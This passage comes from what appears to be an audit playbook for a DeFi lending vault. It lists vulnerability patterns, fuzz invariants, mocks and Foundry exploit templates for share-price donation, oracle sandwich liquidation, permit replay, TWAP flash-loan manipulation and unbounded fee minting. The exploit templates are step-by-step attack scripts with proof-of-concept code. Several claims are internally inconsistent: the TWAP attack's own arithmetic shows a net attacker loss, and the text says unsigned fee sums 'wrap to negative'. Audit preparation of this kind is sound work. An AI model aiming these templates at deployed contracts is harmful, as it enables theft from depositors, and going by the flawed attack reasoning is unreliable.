  1. Deploy with TWAP window = 15 blocks
  2. Create flashloan test: flashloan 100x vault size, deposit, measure TWAP
  3. Verify TWAP is affected; rates change incorrectly
- **Test mapping:** TST-SIM-008, EXP-010
- **Priority:** 5/5

**PR-ORACLE-013 - Oracle Round Mismatch (Chainlink)**
- **Pattern:** Vault queries `latestRoundData()` but does not validate returned roundId matches currentRoundId
- **Root cause:** Missing roundId validation
- **Attack sketch:**
  1. Chainlink transitions between rounds at block N
  2. Attacker queries oracle at block N (round transition in progress)
  3. Oracle returns old round data (roundId = N-1)
  4. Attacker uses stale price for liquidation
- **Checklist:**
  1. Mock Chainlink oracle with round transition logic
  2. Query oracle during round transition
  3. Verify returned roundId is current (not old)
- **Test mapping:** TST-UNIT-041
- **Priority:** 3/5

**PR-ORACLE-014 - Oracle Zero Price**
- **Pattern:** Oracle returns price = 0 (e.g., due to upstream error); vault does not check for zero
- **Root cause:** Missing `require(price > 0)`
- **Attack sketch:**
  1. Oracle malfunction; returns price = 0
  2. LTV calc: `collateral * 0 / debt` = 0 (all collateral worthless)
  3. All positions immediately liquidatable
- **Checklist:**
  1. Mock oracle return price = 0
  2. Attempt deposit/liquidation
  3. Verify vault reverts (does not proceed with zero price)
- **Test mapping:** TST-UNIT-042
- **Priority:** 5/5

**PR-ORACLE-015 - Chainlink Price Feed Downtime**
- **Pattern:** Chainlink oracle goes down; vault has no fallback; liquidations cannot proceed (or use stale price)
- **Root cause:** Missing fallback oracle or circuit breaker
- **Attack sketch:**
  1. Chainlink node failure; oracle not updated for 24 hours
  2. Attacker attempts liquidation; vault queries oracle; reverts (stale data detected)
  3. Liquidations DOS'd; underwater positions not cleared
  4. Attacker avoids liquidation while protocol accumulates bad debt
- **Checklist:**
  1. Set oracle update time > MAX_AGE
  2. Attempt liquidation; verify it reverts or uses fallback
  3. Verify fallback oracle is functional
- **Test mapping:** TST-UNIT-043
- **Priority:** 4/5

### Fee Patterns (PR-FEE-001 … PR-FEE-035)

**PR-FEE-011 - Fee Minting Privilege Escalation**
- **Pattern:** Fee receiver address is hardcoded and can mint unlimited shares to itself (if fee receiver == owner)
- **Root cause:** Fee receiver allowed to mint; no cap on fee rate
- **Attack sketch:**
  1. Factory deployed with feeReceiver = attacker
  2. Attacker calls `vault.mintFees(1000000)` (mints huge share amount to self)
  3. Attacker redeems shares for all collateral; vault is drained
- **Checklist:**
  1. Deploy vault with attacker as fee receiver
  2. Measure fee accrual per block
  3. Attempt to mint excess fees; verify it reverts or is capped
- **Test mapping:** TST-UNIT-044, EXP-020
- **Priority:** 5/5

**PR-FEE-012 - Fee Receiver Compensation Shortfall**
- **Pattern:** Fees accrue but fee receiver never receives them (bug in distribution logic); fees are lost forever
- **Root cause:** Fee mint logic broken or unreachable
- **Attack sketch:**
  1. Vault accrues 100 USDC fees
  2. Fee receiver address stored in state
  3. `mintFees()` function reverts (due to bug)
  4. Fees remain in state; never distributed
  5. Attacker exploits by redeeming early (before fee release attempted)
- **Checklist:**
  1. Accrue fees over 100 blocks
  2. Call `mintFees()` manually
  3. Verify fee receiver receives correct share amount
  4. Verify `mintFees()` does not revert
- **Test mapping:** TST-UNIT-045
- **Priority:** 3/5

**PR-FEE-013 - Fee Rate Overflow**
- **Pattern:** Fee rates (deployment, interest, liquidation) can sum to > 100%; during fee calculation, overflow wraps to negative
- **Root cause:** No validation that total fee <= 100%
- **Attack sketch:**
  1. Factory initialized with deploymentFee = 60%, interestFee = 50%, liquidationFee = 20%
  2. Total = 130%; during accrual, calculation overflows
  3. Fees wrap to negative; attacker gets paid instead of charged
- **Checklist:**
  1. Deploy vault with total fees > 100%
  2. Measure accrued fees; verify they do not exceed 100% of interest
  3. Verify vault reverts during deployment if fees > 100%
- **Test mapping:** TST-UNIT-046
- **Priority:** 4/5

**PR-FEE-014 - Fee Accrual Race Condition**
- **Pattern:** Fee accrual triggered by external call; attacker can call multiple times within same block; fees are double-counted
- **Root cause:** Block-based timestamp not checked; same block can trigger accrual multiple times
- **Attack sketch:**
  1. Attacker calls `accrueInterest()` in same tx twice
  2. Fees accrued twice for same time period
  3. Vault share supply inflated; other users diluted
- **Checklist:**
  1. Call `accrueInterest()` twice in same block
  2. Measure total fees accrued; verify <= expected
  3. Verify function reverts if called twice in same block
- **Test mapping:** TST-UNIT-047
- **Priority:** 4/5

### Permission / Access Patterns (PR-PERM-011 … PR-PERM-035)

**PR-PERM-011 - Permit Signature Domain Separator Mismatch**
- **Pattern:** Permit uses hardcoded domain separator; if vault is deployed at different address on fork, domain is invalid
- **Root cause:** Domain separator baked in; not using `this.address`
- **Attack sketch:**
  1. Vault deployed on mainnet at address A; domain separator = keccak256(A, chainId)
  2. Vault code is deployed on testnet fork; new address B
  3. Permit signature from mainnet used on testnet; domain mismatch; signature invalid
- **Checklist:**
  1. Snapshot domain separator at deployment
  2. On fork, verify domain separator changes (address changes)
  3. Attempt permit signature from original chain on fork; should fail
- **Test mapping:** TST-UNIT-048
- **Priority:** 3/5

**PR-PERM-012 - Liquidator Authorization Bypass**
- **Pattern:** Liquidator must be whitelisted; whitelist stored in mutable mapping; attacker can add self
- **Root cause:** Whitelist setter is public or has weak access control
- **Attack sketch:**
  1. Liquidator whitelist: `isLiquidator[address] = true/false`
  2. Attacker calls `setLiquidator(attacker, true)`
  3. Attacker can now liquidate positions; captures liquidation bonus
- **Checklist:**
  1. Attempt to add arbitrary address to liquidator whitelist
  2. Verify call reverts (only owner can add)
  3. Verify owner-added liquidator can liquidate
- **Test mapping:** TST-UNIT-049
- **Priority:** 4/5

**PR-PERM-013 - Rate Keeper Delegation Loophole**
- **Pattern:** Rate keeper can be delegated; attacker tricks owner into delegating to attacker
- **Root cause:** Delegation mechanism exposed without verification
- **Attack sketch:**
  1. Owner calls `delegateRateKeeper(attacker)` (via social engineering)
  2. Attacker can now update rates arbitrarily
  3. Attacker sets rates to 1000%; liquidations cascade
- **Checklist:**
  1. Snapshot current keeper
  2. Attempt to delegate keeper to another address; verify call reverts (or requires approval)
  3. Verify delegation requires multi-sig or timelock
- **Test mapping:** TST-UNIT-050
- **Priority:** 3/5

---

## Attack Templates (EXP-001 … EXP-050)

### Direct Exploitation

**EXP-001 - Share Price Donation + Redeem**
```
Target: Vault.sol::deposit, Vault.sol::redeem

Preconditions:
  - Attacker has 2000 collateral tokens
  - Vault is deployed, empty
  - No deposits yet (first depositor)

Attack Steps:
  TX1: attacker calls vault.deposit(1, attacker)
    - Expected state: totalShares = 1, totalAssets = 1, attacker balance = 1 share
    
  TX2: attacker calls token.transfer(vault, 1000)
    - Expected state: vault.balanceOf = 1001, state totalAssets = 1 (stale)
    
  TX3: victim calls vault.deposit(1000, victim)
    - Expected state: victim receives 1000 * 1 / 1001 ≈ 0 shares (rounding to 0)
    
  TX4: attacker calls vault.redeem(1, attacker, attacker)
    - Expected state: attacker receives vault.balanceOf = 1001 tokens
    - Victim receives 0; attacker gets ~1000 of victim's deposit

Damage Metric:
  - Victim loss: 1000 - 0 = 1000 tokens
  - Attacker gain: 1000 tokens
  - Invariant broken: INV-003 (total assets != sum of user balances)

Foundry Test Template:
  function testSharePriceDonation() public {
    uint256 attackerInitial = 2000e18;
    deal(collateral, attacker, attackerInitial);
    
    // TX1: First deposit
    vm.startPrank(attacker);
    token.approve(vault, 1e18);
    vault.deposit(1e18, attacker);
    uint256 sharesAfterFirst = vault.balanceOf(attacker);
    assertEq(sharesAfterFirst, 1e18);
    vm.stopPrank();
    
    // TX2: Direct transfer (donation)
    vm.prank(attacker);
    token.transfer(vault, 1000e18);
    
    // TX3: Victim deposit
    deal(collateral, victim, 1000e18);
    vm.startPrank(victim);
    token.approve(vault, 1000e18);
    vault.deposit(1000e18, victim);
    uint256 sharesAfterVictim = vault.balanceOf(victim);
    vm.stopPrank();
    
    // Verify victim received 0 shares (or minimal shares)
    assertEq(sharesAfterVictim, 0); // Expected to fail; victim should get shares
    
    // TX4: Attacker redeems all vault balance
    vm.prank(attacker);
    vault.redeem(sharesAfterFirst, attacker, attacker);
    uint256 attackerFinal = token.balanceOf(attacker);
    
    // Attacker now has ~1001 tokens; profit = 1000 from victim
    assertGt(attackerFinal, attackerInitial + 500e18);
  }
```
- **Priority:** 5/5

**EXP-002 - Oracle Sandwich + Liquidation**
```
Target: Vault.sol::liquidate, PriceOracle.sol::getPrice

Preconditions:
  - Victim has collateral deposit; borrowed amount = 0.8 * collateralValue
  - TWAP window = 15 blocks
  - Attacker has 100M collateral tokens (flashloanable)

Attack Steps:
  TX1 (Block N-1): Attacker monitors mempool for liquidation opportunity
  TX2 (Block N): Attacker flashloans 50M collateral tokens
  TX3 (Block N): Attacker deposits 50M tokens into vault
    - Vault's collateral amount temporarily 50M higher
    - Collateral price in underlying DEX spikes 5%
  TX4 (Block N to N+14): Attacker holds position; TWAP captures price spike
  TX5 (Block N+15): Interest rate controller reads TWAP; rate increases 10% → 15%
  TX6 (Block N+15): Victim's position now undercollateralized (due to rate spike)
    - Health factor: 100% / 115% = 87% < 100% (liquidatable)
  TX7 (Block N+15): Attacker calls liquidate(victim, amount)
    - Liquidation success; attacker captures liquidation bonus
    - Attacker seizes extra collateral
  TX8 (Block N+16): Attacker withdraws 50M collateral + profit
  TX9 (Block N+16): Attacker repays flashloan

Damage Metric:
  - Victim loss: liquidated balance + penalty
  - Attacker gain: liquidation bonus + collateral arbitrage
  - Invariant broken: INV-019 (oracle freshness), INV-013 (health factor should be stable)

Foundry Test Template:
  function testOracleSandwichLiquidation() public {
    // Setup: victim deposit
    uint256 victimCollateral = 1000e18;
    deal(collateral, victim, victimCollateral);
    vm.startPrank(victim);
    token.approve(vault, victimCollateral);
    vault.deposit(victimCollateral, victim);
    vault.borrow(800e18); // LTV = 80%
    vm.stopPrank();
    
    // Attacker sandwich: flashloan + deposit
    uint256 flashAmount = 50000e18;
    deal(collateral, attacker, 1e18); // Minimal initial; rest via flashloan
    
    // Simulate flashloan + sandwich deposit in same block
    vm.startPrank(attacker);
    token.approve(vault, flashAmount);
    vault.deposit(flashAmount, attacker);
    // Price spike captured by TWAP
    vm.stopPrank();
    
    // Advance blocks; TWAP window passes
    for (uint i = 0; i < 15; i++) {
      vm.roll(block.number + 1);
    }
    
    // Rate update reads spiked TWAP
    vm.prank(rateKeeper);
    rateController.updateRate();
    uint256 newRate = rateController.currentRate();
    assertGt(newRate, previousRate); // Rate spiked
    
    // Victim is now liquidatable
    uint256 healthBefore = vault.healthFactor(victim);
    assertLt(healthBefore, 1e18); // < 100% = liquidatable
    
    // Attacker liquidates
    vm.prank(attacker);
    vault.liquidate(victim, 400e18); // Liquidate 50% of debt
    
    // Verify attacker captured profit
    uint256 attackerBalance = vault.balanceOf(attacker);
    assertGt(attackerBalance, flashAmount); // Attacker gained tokens
  }
```
- **Priority:** 5/5

**EXP-003 - Permit Replay (Chain ID Omission)**
```
Target: Vault.sol::permit (EIP712 signature verification)

Preconditions:
  - User (Alice) has approved attacker for spend via permit on mainnet
  - Vault is deployed on mainnet and testnet fork
  - Permit signature does NOT include chainId

Attack Steps:
  TX1 (Mainnet): Alice signs permit(attacker, 1000 shares, nonce=0, deadline=block.timestamp+1 hour)
    - Signature is: sig = sign(keccak256(permit data))
  TX2 (Mainnet): Attacker submits permit; nonce incremented to 1
  TX3 (Fork/Testnet): Attacker replays same signature
    - Permit domain separator should be different (different address or chainId)
    - But if chainId omitted, domain separator matches
  TX4 (Fork/Testnet): Attacker spends approved 1000 shares (or more)

Damage Metric:
  - Victim loss: spend on fork
  - Attacker gain: tokens on both chains (if victim has funds on fork)
  - Invariant broken: INV-031 (permit nonce must increment), INV-001 (permit scope limited to chain)

Foundry Test Template:
  function testPermitReplayAcrossChains() public {
    // Setup
    uint256 initialBalance = 1000e18;
    deal(stablecoin, alice, initialBalance);
    
    // On mainnet: Alice signs permit
    bytes32 permitHash = keccak256(abi.encode(
      PERMIT_TYPEHASH,
      alice,
      attacker,
      1000e18, // approve 1000
      0, // nonce
      block.timestamp + 1 hours
    ));
    
    (uint8 v, bytes32 r, bytes32 s) = sign(alice, permitHash);
    
    // TX1: Mainnet permit (should succeed)
    vm.prank(attacker);
    vault.permit(alice, attacker, 1000e18, block.timestamp + 1 hours, v, r, s);
    
    uint256 nonce1 = vault.nonces(alice);
    assertEq(nonce1, 1); // Nonce incremented
    
    // TX2: Fork to different chainId
    uint256 forkId = vm.createFork("https://...", blockNumber);
    vm.selectFork(forkId);
    
    // Deployed vault on fork has different address
    // But if chainId not included in domain, signature still valid
    uint256 nonceOnFork = vault.nonces(alice);
    assertEq(nonceOnFork, 0); // Fresh nonce on fork
    
    // TX3: Attacker replays same signature on fork
    vm.prank(attacker);
    vault.permit(alice, attacker, 1000e18, block.timestamp + 1 hours, v, r, s);
    
    uint256 nonce2 = vault.nonces(alice);
    assertEq(nonce2, 1); // Nonce incremented on fork too
    
    // Verify attacker has approval on both chains (failure case)
    // On mainnet: attacker approved for 1000 (expected)
    // On fork: attacker approved for 1000 (BUG; should fail if chainId binding exists)
    
    // Test should verify that signature is INVALID on fork (correct behavior)
    // If test passes without revert, bug is confirmed
  }
```
- **Priority:** 4/5

### Complex Multi-Step

**EXP-010 - TWAP Spike via Flash Loan + Rate Update + Liquidation**
```
Target: Vault.sol::deposit, RateController.sol::updateRate, Vault.sol::liquidate

Preconditions:
  - Victim: 10000 USDC collateral, 8000 USDC borrowed (LTV 80%, HF 125%)
  - Attacker: 1 USDC (will use flashloan)
  - TWAP window: 15 blocks (insufficient)
  - Underlying DEX: liquidity pool for USDC/collateral

Attack Steps:
  TX1 (Block 100): Attacker observes victim is liquidatable if rates spike 50%
  TX2 (Block 100): Attacker initiates flashloan of 100M USDC from Uniswap
  TX3 (Block 100): Attacker deposits 100M USDC into vault (not via deposit, but via direct transfer to spiked DEX)
    - Vault's collateral amount in tracking system increases 100M
    - Underlying DEX price for collateral spikes 5% (supply/demand)
    - TWAP oracle starts capturing this spike
  TX4 (Block 101-114): Attacker maintains position; blocks advance
    - TWAP window: blocks 100-114 (15-block window)
    - TWAP price: average of spiked prices from TX3
  TX5 (Block 115): Rate controller queries TWAP price (now 5% higher due to spike)
    - Rate calculation: rate = f(utilization * price)
    - Higher price => higher utilization => higher rate
    - Rate increases 12% (e.g., 5% → 17%)
  TX6 (Block 115): All borrows now accrue at 17% instead of 5%
    - Victim's debt: 8000 @ 5% => 8000 @ 17%
    - Health factor: collateralValue / debt @ newRate = 10000 / (8000 * 1.17) = 107% => < 110% (liquidatable)
  TX7 (Block 115): Attacker calls liquidate(victim, 4000)
    - Liquidates half of victim's debt
    - Attacker receives collateral seize: 4000 * 1.05 (5% liquidation bonus) = 4200
    - Victim loses 4000 USDC in collateral (seize)
  TX8 (Block 116): Attacker withdraws 100M USDC from vault (or as much as liquidity allows)
    - Attacker also retains seized collateral (4200)
  TX9 (Block 116): Attacker repays 100M USDC flashloan (+ 0.03% fee = 30K USDC)

Damage Metric:
  - Victim loss: 4200 USDC collateral seized + 4000 USDC debt liquidated = net -4200 (liquidation penalty)
  - Attacker gain: 4200 - 30K (flashloan fee) = -25.8K (net loss if collateral price reverts)
    - If attacker can dump seized collateral on secondary market: +4200 - 30K = -25.8K (still loss)
    - If attacker can predict that victim collateral is overvalued: potential profit via arbitrage
    - **Actual exploit value:** Victim is forced-liquidated; attacker captures ecosystem share dilution

Foundry Test Template:
  function testTWAPSpikeViaFlashLoanAndLiquidation() public {
    // Setup victim
    uint256 victimCollateral = 10000e18;
    uint256 victimBorrow = 8000e18;
    deal(collateral, victim, victimCollateral);
    vm.startPrank(victim);
    collateral.approve(vault, victimCollateral);
    vault.deposit(victimCollateral, victim);
    vault.borrow(victimBorrow);
    vm.stopPrank();
    
    uint256 healthBefore = vault.healthFactor(victim);
    assertGt(healthBefore, 1.1e18); // HF > 110% (safe)
    
    // Attacker flashloan + deposit sandwich
    uint256 flashAmount = 100000e18;
    
    // Mock flashloan execution
    vm.startPrank(attacker);
    // Simulate flashloan: attacker receives flashAmount temporarily
    deal(collateral, attacker, flashAmount);
    
    // Deposit into vault (spikes price in underlying DEX)
    collateral.approve(vault, flashAmount);
    vault.deposit(flashAmount, attacker);
    
    // Price spikes in underlying DEX (simulated via price oracle mock)
    // priceFeed.setPrice(collateral, basePrice * 105 / 100); // 5% spike
    
    vm.stopPrank();
    
    // Advance blocks; TWAP captures spike
    for (uint i = 0; i < 15; i++) {
      vm.roll(block.number + 1);
      // In each block, underlying DEX price remains at +5%
    }
    
    // Rate controller updates; reads spiked TWAP
    vm.prank(rateKeeper);
    rateController.updateRate();
    uint256 newRate = rateController.currentRate();
    uint256 oldRate = 0.05e18; // 5%
    assertGt(newRate, oldRate); // Rate increased
    
    // Victim is now liquidatable
    uint256 healthAfter = vault.healthFactor(victim);
    assertLt(healthAfter, 1.1e18); // HF < 110% (liquidatable)
    
    // Attacker liquidates
    vm.startPrank(attacker);
    uint256 repayAmount = 4000e18; // Liquidate 50% of debt
    vault.liquidate(victim, repayAmount);
    
    uint256 attackerCollateralBalance = vault.balanceOf(attacker);
    assertGt(attackerCollateralBalance, flashAmount); // Attacker gained collateral via liquidation bonus
    
    // Attacker withdraws (repays flashloan + keeps profit)
    // In real scenario: attacker dumps collateral on secondary market
    
    vm.stopPrank();
  }
```
- **Priority:** 5/5

**EXP-020 - Deployer Fee Minting (Unlimited Share Inflation)**
```
Target: Vault.sol::mintFees (if called by deployer), Factory.sol::initialize

Preconditions:
  - Attacker is factory deployer
  - Fee receiver set to attacker
  - Vault deployed with interest accrual enabled
  - No cap on mintFees() call

Attack Steps:
  TX1: Attacker (deployer) initializes factory with feeReceiver = attacker
  TX2: Attacker deploys vault via factory
    - Vault params: LTV 80%, rate 5%, deployment complete
    - Fee receiver = attacker (immutable after this)
  TX3 (Block 0-1000): Normal vault operations
    - Users deposit collateral, borrow, generate interest
    - Interest accrues: 0.05 * totalBorrow per block
    - Fees accumulate in vault state
  TX4 (Block 1001): Attacker calls vault.mintFees(10000000)
    - Expected: mintFees mints accumulated fees to fee receiver
    - Bug: No cap on mintFees; attacker can mint unlimited shares
  TX5: Attacker receives 10M shares (unbacked; no collateral)
  TX6: Attacker redeems 10M shares for collateral
    - Redeem logic: shares / totalShares * totalAssets
    - Attacker's shares = 10M; totalShares = 1M (original)
    - Attacker receives: 10M / 11M * totalAssets = 90.9% of all vault assets
  TX7: Vault is drained; remaining users cannot redeem

Damage Metric:
  - Users loss: 90% of vault collateral
  - Attacker gain: 90% of all vault assets
  - Invariant broken: INV-023 (fee accumulation should be <= interest accrued), INV-006 (share supply inflation)

Foundry Test Template:
  function testDeployerFeeMinting() public {
    // Attacker is deployer
    address attacker = deployerAddress;
    
    // Deploy factory with attacker as fee receiver
    vm.prank(attacker);
    factory.initialize(
      collateral,
      stablecoin,
      rateController,
      attacker, // feeReceiver = attacker
      0.002e18, // 0.2% deployment fee
      0.001e18, // 0.1% interest fee
      0.005e18  // 0.5% liquidation fee
    );
    
    // Deploy vault
    address vault = factory.createVault(collateral);
    
    // Normal operations: users deposit and borrow
    uint256 totalUserDeposit = 1000000e18;
    deal(collateral, user1, totalUserDeposit);
    vm.startPrank(user1);
    collateral.approve(vault, totalUserDeposit);
    IVault(vault).deposit(totalUserDeposit, user1);
    IVault(vault).borrow(800000e18); // LTV 80%
    vm.stopPrank();
    
    // Advance time; fees accrue
    vm.roll(block.number + 1000);
    
    // Attacker calls mintFees with unlimited amount
    uint256 excessFeeAmount = 10000000e18; // Mint 10M shares (unbacked)
    vm.prank(attacker);
    IVault(vault).mintFees(excessFeeAmount); // Bug: no cap
    
    // Attacker receives excess shares
    uint256 attackerShares = IVault(vault).balanceOf(attacker);
    assertEq(attackerShares, excessFeeAmount); // Attacker received 10M shares
    
    // Attacker redeems shares
    vm.prank(attacker);
    IVault(vault).redeem(attackerShares, attacker, attacker);
    
    // Attacker drained vault
    uint256 attackerFinal = collateral.balanceOf(attacker);
    assertGt(attackerFinal, totalUserDeposit * 0.9e18); // Attacker got 90%+ of vault
    
    // Remaining users cannot redeem
    vm.prank(user1);
    // IVault(vault).redeem(user1Shares, user1, user1); // This will revert (insufficient balance)
  }
```
- **Priority:** 5/5

---

## Fuzz Targets & Property Templates (TST-FUZZ-001 …)

### Property 1: Fund Conservation (INV-001)

**TST-FUZZ-001 - Total Assets Monotonicity**
```solidity
// Invariant: totalAssets() >= totalAssets(prev) - dust
// State vars to fuzz: deposit amounts, withdrawal amounts, collateral prices, interest rates
// Corpus: [0, 1, 10^decimals-1, 10^decimals, 10^18/2, max/2]

function invariant_totalAssetsMonotonic() public {
    uint256 prevAssets = vault.totalAssets();
    
    // Fuzz input: random operation
    // deposit(amount), withdraw(amount), accrue(), liquidate()
    
    uint256 newAssets = vault.totalAssets();
    assertGe(newAssets, prevAssets - DUST_THRESHOLD);
}
```

### Property 2: Share Supply Integrity (INV-006)

**TST-FUZZ-002 - Share Mint/Burn Consistency**
```solidity
// Invariant: sum of user shares == totalShares
// Corpus: user set size [1, 10, 100], shares per user [1, 10^18, max/100]

function invariant_shareSupplyConsistent() public {
    uint256 trackingSupply = 0;
    for (uint256 i = 0; i < users.length; i++) {
        trackingSupply += vault.balanceOf(users[i]);
    }
    
    uint256 reportedSupply = vault.totalShares();
    assertEq(trackingSupply, reportedSupply);
}
```

### Property 3: Interest Accrual Monotonicity (INV-004)

**TST-FUZZ-003 - Interest Never Decreases**
```solidity
// Invariant: accruedInterest(t) >= accruedInterest(t-1)
// Corpus: time deltas [0, 1 block, 10 blocks, 365 days]

function invariant_interestMonotonic() public {
    uint256 interestBefore = vault.accruedInterest();
    
    vm.roll(block.number + 10);
    vault.accrueInterest();
    
    uint256 interestAfter = vault.accruedInterest();
    assertGe(interestAfter, interestBefore);
}
```

### Property 4: Health Factor Repay Threshold (INV-013)

**TST-FUZZ-004 - Liquidation Invariant**
```solidity
// Invariant: HF >= 1.0 => not liquidatable; HF < 1.0 => liquidatable
// Corpus: prices [50% original, 100% original, 150% original], debts [10%, 50%, 90% collateral]

function invariant_healthFactorThreshold(address user, uint256 priceMultiplier) public {
    uint256 hf = vault.healthFactor(user);
    
    // Liquidate if HF < 1.0
    bool shouldLiquidate = hf < 1e18;
    
    vm.prank(liquidator);
    if (shouldLiquidate) {
        vault.liquidate(user, 1); // Should succeed
    } else {
        vm.expectRevert(); // Should revert if HF >= 1.0
        vault.liquidate(user, 1);
    }
}
```

### Property 5: Share Price Rounding (INV-007)

**TST-FUZZ-005 - No Rounding to Zero on Deposit**
```solidity
// Invariant: deposit(1 wei) must result in shares > 0 OR revert
// Corpus: share prices [1e18, 1e20, 1e24], amounts [1, 10, 100]

function invariant_noRoundingToZero(uint256 depositAmount) public {
    vm.assume(depositAmount > 0 && depositAmount <= 1e24);
    
    uint256 sharesBefore = vault.totalShares();
    
    deal(collateral, actor, depositAmount);
    vm.startPrank(actor);
    collateral.approve(vault, depositAmount);
    vault.deposit(depositAmount, actor);
    vm.stopPrank();
    
    uint256 sharesAfter = vault.totalShares();
    assertGt(sharesAfter, sharesBefore);
}
```

---

## Minimal Mocks & Harness Patterns

### ERC20Mock with Fee-on-Transfer

```solidity
contract ERC20FeeOnTransferMock is ERC20 {
    uint256 public constant FEE_PERCENT = 10; // 0.1%
    
    constructor() ERC20("FeeToken", "FEE") {}
    
    function transfer(address to, uint256 amount) public override returns (bool) {
        uint256 fee = (amount * FEE_PERCENT) / 10000;
        uint256 amountAfterFee = amount - fee;
        
        // Burn fee
        _burn(msg.sender, fee);
        
        // Transfer remainder
        super.transfer(to, amountAfterFee);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount)
        public
        override
        returns (bool)
    {
        uint256 fee = (amount * FEE_PERCENT) / 10000;
        uint256 amountAfterFee = amount - fee;
        
        _burn(from, fee);
        super.transferFrom(from, to, amountAfterFee);
        return true;
    }
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}
```

### OracleMock (Stateful Price Feed)

```solidity
contract OracleMock {
    uint256 public price = 1e18; // Default: $1 per token (18 decimals)
    uint256 public lastUpdate = block.timestamp;
    
    function setPrice(uint256 _price) public {
        price = _price;
        lastUpdate = block.timestamp;
    }
    
    function getPrice() public view returns (uint256) {
        return price;
    }
    
    function getPriceWithAge() public view returns (uint256 _price, uint256 _age) {
        _price = price;
        _age = block.timestamp - lastUpdate;
    }
    
    function setStalePrice(uint256 _price, uint256 _age) public {
        price = _price;
        lastUpdate = block.timestamp - _age;
    }
}
```

### TWAPOracleMock (Spiked Price Tracking)

```solidity
contract TWAPOracleMock {
    uint256[] public prices;
    uint256[] public timestamps;
    uint256 public windowSize = 15; // blocks
    
    function recordPrice(uint256 price) public {
        prices.push(price);
        timestamps.push(block.timestamp);
    }
    
    function getTWAP() public view returns (uint256) {
        require(prices.length >= windowSize, "Insufficient history");
        
        uint256 sum = 0;
        for (uint256 i = prices.length - windowSize; i < prices.length; i++) {
            sum += prices[i];
        }
        return sum / windowSize;
    }
    
    // Simulate spike
    function setPrices(uint256[] memory _prices) public {
        prices = _prices;
        for (uint256 i = 0; i < _prices.length; i++) {
            timestamps.push(block.timestamp - (15 - i));
        }
    }
}
```

### ReentrantTokenMock (ERC777 Callback)

```solidity
contract ReentrantTokenMock is ERC777 {
    IVault public vault;
    
    constructor(address _vault) ERC777("Reentrant", "REENT", new address[](0)) {
        vault = IVault(_vault);
    }
    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        // Simulate ERC777 callback
        // Attacker reenters here
        if (to == address(vault) && from != address(0)) {
            // Reenter during transfer
            try vault.withdraw(amount / 2, from, from) {
                // Reentered successfully; state may be inconsistent
            } catch {
                // Expected to revert if guarded
            }
        }
    }
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount, "", "");
    }
}
```

### VaultMock (Forcing Accounting Mismatch)

```solidity
contract VaultMock {
    mapping(address => uint256) public balances;
    uint256 public totalAssetsState;
    
    // Allow manipulation of totalAssets to not match actual balance
    function setTotalAssets(uint256 amount) public {
        totalAssetsState = amount;
    }
    
    // totalAssets() returns state value (not actual balance)
    function totalAssets() public view returns (uint256) {
        return totalAssetsState;
    }
    
    // Actual balance may differ
    function realBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

---

## Invariant-to-Test Mapping Table

| Invariant ID | Title | Test Template | Exploit Template | Pattern ID | Priority |
|---|---|---|---|---|---|
| INV-001 | Total Supply Conservation | TST-FUZZ-001 | EXP-001 | PR-VAULT-001 | 5/5 |
| INV-002 | Share Price Monotonicity | TST-FUZZ-002 | EXP-001 | PR-VAULT-002 | 5/5 |
| INV-004 | Interest Accrual Lower Bound | TST-FUZZ-003 | EXP-010 | PR-INT-001 | 5/5 |
| INV-006 | Share Mint/Burn Balance | TST-UNIT-001 | EXP-001 | PR-VAULT-006 | 5/5 |
| INV-007 | Share Price Precision | TST-UNIT-002 | EXP-001 | PR-VAULT-002 | 5/5 |
| INV-013 | Health Factor Repay Threshold | TST-FUZZ-004 | EXP-002 | PR-ORACLE-001 | 5/5 |
| INV-019 | Oracle Freshness Binding | TST-UNIT-007 | EXP-002 | PR-ORACLE-001 | 5/5 |
| INV-023 | Fee Accumulation Monotonicity | TST-FUZZ-005 | EXP-020 | PR-FEE-001 | 4/5 |
| INV-026 | Deployer Immutability | TST-UNIT-011 | EXP-020 | PR-FAC-001 | 5/5 |
| INV-031 | Permit Nonce Increment | TST-UNIT-015 | EXP-003 | PR-PERM-001 | 4/5 |
| INV-033 | Reentrancy Guard Protection | TST-REENT-002 | EXP-001 | PR-REENT-001 | 5/5 |

---

## Priority Checklist & Sprint Plan

### Top 20 Test Cases (Recommended Order)

| # | Test ID | Title | Category | Est. Time | Method |
|---|---|---|---|---|---|
| 1 | TST-UNIT-034 | Share Price Donation Attack | Unit | 30 min | Direct exploitation |
| 2 | TST-FUZZ-001 | Total Assets Monotonicity | Fuzz | 45 min | Property-based |
| 3 | TST-UNIT-011 | Deployer Immutability | Unit | 20 min | Access control |
| 4 | TST-UNIT-037 | Oracle Staleness Check | Unit | 25 min | Oracle validation |
| 5 | TST-UNIT-040 | Oracle Decimals Normalization | Unit | 30 min | Precision check |
| 6 | TST-REENT-003 | Reentrancy in Deposit | Unit | 40 min | CEI violation |
| 7 | TST-FUZZ-004 | Health Factor Liquidation | Fuzz | 60 min | Liquidation boundary |
| 8 | TST-UNIT-046 | Fee Rate Overflow | Unit | 25 min | Math overflow |
| 9 | TST-UNIT-031 | Interest Controller Injection | Unit | 30 min | Factory params |
| 10 | TST-UNIT-015 | Permit Nonce Replay | Unit | 35 min | EIP712 signature |
| 11 | TST-SIM-008 | TWAP Spike via Flash Loan | Sim | 90 min | Multi-step attack |
| 12 | TST-UNIT-001 | Share Mint Balance | Unit | 20 min | Share supply |
| 13 | TST-UNIT-043 | Chainlink Fallback Oracle | Unit | 40 min | Oracle fallback |
| 14 | TST-FUZZ-010 | Share Rounding Leak | Fuzz | 50 min | Rounding invariant |
| 15 | TST-UNIT-002 | Share Transfer Restriction | Unit | 25 min | Share transferability |
| 16 | TST-UNIT-039 | Interest Overflow | Unit | 35 min | Exponential calc |
| 17 | TST-UNIT-044 | Fee Minting Privilege | Unit | 30 min | Fee extraction |
| 18 | TST-SIM-005 | Factory Counterfactual Address | Sim | 60 min | CREATE2 collision |
| 19 | TST-UNIT-041 | Chainlink Round Mismatch | Unit | 30 min | Chainlink rounds |
| 20 | TST-UNIT-047 | Accrual Race Condition | Unit | 35 min | Block-based race |

**Estimated Total Time:** ~12-15 hours of test development + 20-30 hours execution

---

## Report Templates & Submission Checklist

### Required Artifacts for Sherlock-Style Report

- [ ] **Minimal Reproducible Test (Foundry)**
  - File: `test/exploit/ExploitName.t.sol`
